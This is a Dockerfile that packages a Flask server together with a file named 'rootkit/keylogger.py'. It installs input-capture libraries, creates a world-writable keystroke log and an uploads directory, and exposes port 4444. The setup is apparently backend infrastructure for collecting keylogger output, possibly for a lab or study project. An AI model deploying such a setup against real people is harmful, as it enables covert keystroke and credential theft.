FROM python:3.9-slim

WORKDIR /app

# Install system dependencies
RUN apt-get update && apt-get install -y \
    gcc \
    libc6-dev \
    libx11-dev \
    libxtst-dev \
    libxext-dev \
    libxi-dev \
    psmisc \
    && rm -rf /var/lib/apt/lists/*

# Install Python dependencies
RUN pip install --no-cache-dir flask flask-cors pynput

# Copy the server code and keylogger
COPY server/server.py .
COPY rootkit/keylogger.py .

# Create necessary directories and files
RUN mkdir -p uploads && \
    touch keylog.txt redirects.json && \
    chmod 777 uploads keylog.txt redirects.json

# Switch to non-root user
USER nobody

# Expose the port
EXPOSE 4444

# Start the Flask server
CMD ["python", "server.py"] 